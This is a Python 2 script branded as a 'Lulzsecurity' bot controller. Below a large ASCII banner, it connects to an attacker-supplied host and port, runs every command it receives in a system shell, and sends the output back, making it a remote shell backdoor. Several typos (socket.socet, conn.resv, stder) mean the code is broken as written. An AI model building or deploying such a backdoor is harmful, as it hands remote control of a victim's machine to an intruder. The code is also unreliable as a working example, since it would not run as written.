#bin/env/python
#-*- coding: utf-8 -*-

import progressbar, matplotlib
import socket, subprocess as sp, sys

from time import sleep

SMALL_SIZE = 8
matplotlib.rc('font', size=SMALL_SIZE)
matplotlib.rc('axes', titlesize=SMALL_SIZE)
 

#colorschema
class colors:
    RED ="\033[31m"
    BLUE ="\033[34m"
    GREEN ="\033[32m"	
    RESET ="\033[0m"
    BLACK ="\033[30m"      
    YELLOW ="\033[33m"      
    MAGENTA ="\033[35m"      
    CYAN ="\033[36m"      
    WHITE ="\033[37m"  
    ORANGE ="\033[38m"
    BOLDBLACK ="\033[1m\033[30m"    
    BOLDYELLOW ="\033[1m\033[33m"      
    BOLDMAGENTA ="\033[1m\033[35m"      
    BOLDCYAN ="\033[1m\033[36m"     
    BOLDWHITE ="\033[1m\033[37m"     
    BOLDBLUE ="\033[1m\033[34m"
    BOLDGREEN ="\033[1m\033[32m"
    BOLDRED ="\033[1m\033[31m"
    BOLDORANGE ="\033[1m\033[38m"
    LIGHTGREEN ="\033[2m\033[30m"
    LIGHTRED ="\033[2m\033[31m"
    LIGHTBLUE ="\033[2m\033[32m"
    LIGHTYELLOW ="\033[2m\033[33m"
    LIGHTORANGE ="\033[2m\033[34m"
    LIGHTCYAN ="\033[2m\033[35m"
    LIGHTBLACK = "\033[2m\033[36m"
    LIGHTMAGENTA ="\033[2m\033[37m"


__version__ = "0.1"
__author__ = "Sensei | Nom3n N35c1o"
__toolname____ = ["Universal lulzsecurity bot controler"] 
__website__ = ""

#banner     
print colors.RED +'This is a official Lulzsecurity Universal tool'
print colors.BOLDRED +      ("        ▄▄▄███                          ")
print colors.BOLDRED +      ("   ▄▄██████████                         ")
print colors.BOLDRED +      (" ███████████████                        ")
print colors.BOLDORANGE +   (" ▀███████████████     ▄▄▄               ")
print colors.BOLDORANGE +   ("  ███████████████▄███▀▀▀                ")
print colors.BOLDYELLOW +   ("   ███████████████▄▄                    ")
print colors.BOLDYELLOW +   ("   ▄████████▀▀▄▄▄▄▄░▀                   ")
print colors.YELLOW +       ("▄███████▀█▄▀█▄░░█░▀▀▀░█  ▄▄             ")
print colors.BOLDGREEN +    ("▀▀   ██▄█▄░░▀█░░▄███████▄█▀   ▄         ")        
print colors.BOLDGREEN +    ("     █░█▀▄▄▀▄▀░█▀▀▀█▀▄▄▀      ▄ ▄█      ")
print colors.BOLDGREEN +    ("     █░█░░▀▀▄▄█▀░█▀▀░░█       ▀██       ")     
print colors.BOLDCYAN +     ("     ▀█▄░░░░░░░░░░░░░▄▀      ▄██        ") 
print colors.BOLDCYAN  +    ("      ▀█▄▄░░░░░░░░▄▄█      ▄▀ █         ")
print colors.BOLDCYAN  +    ("        ▀███▀▀████▄██▄▄  ▄▀             ")
print colors.BOLDBLUE  +    ("          █▄▀██▀██▀▄█▄ ▀▀               ")  
print colors.BOLDBLUE   +   ("          ██░▀█▄█ █▀ ▀▄                 ")
print colors.BOLDBLUE   +   ("          █░█▄░░▀█▄▄▄  █                ")
print colors.BOLDMAGENTA +  ("          █▀██▀▀▀▀ █▄  █                ")
print colors.BOLDMAGENTA +  ("             ▀         ▀                ")

print colors.BOLDRED     +   ("██╗     ██╗   ██╗██████╗  ██████╗   ██████╗ ██╗   ██╗") 
print colors.BOLDYELLOW  +   ("██║     ██║   ██║██╔══██╗██╔════╝   ██╔══██╗╚██╗ ██╔╝") 
print colors.BOLDGREEN   +   ("██║     ██║   ██║██████╔╝██║        ██████╔╝ ╚████╔╝ ") 
print colors.BOLDCYAN    +   ("██║     ██║   ██║██╔══██╗██║        ██╔═══╝   ╚██╔╝  ") 
print colors.BOLDBLUE    +   ("███████╗╚██████╔╝██████╔╝╚██████╗██╗██║        ██║   ") 
print colors.BOLDRED     +   ("╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝╚═╝╚═╝        ╚═╝   ") 

print 
print     
print colors.BOLDBLUE
print __author__
print
print colors.BOLDYELLOW
print __toolname____
print 
print colors.BOLDGREEN
print __version__
print 

host = str(sys.argv[1])
port = int(sys.argv[2])

conn = socket.socet(socket.AF_INET, socet.SOCK_STREAM)
conn.connect((host,port))

while 1:
    command = str(conn.resv(1024))
    if command != "exit()":
        sh = sp.Popen(command, shell=True,
            stdout=sp.PIPE,
            stder=sp.PIPE,
            stdin=sp.PIPE)
        out, err = sh.communicate()
        result =str(out) + str(err)
        length = str(len(result)).zfill(16)
        conn.send(length + result)
    else:
        break       
conn.close()        
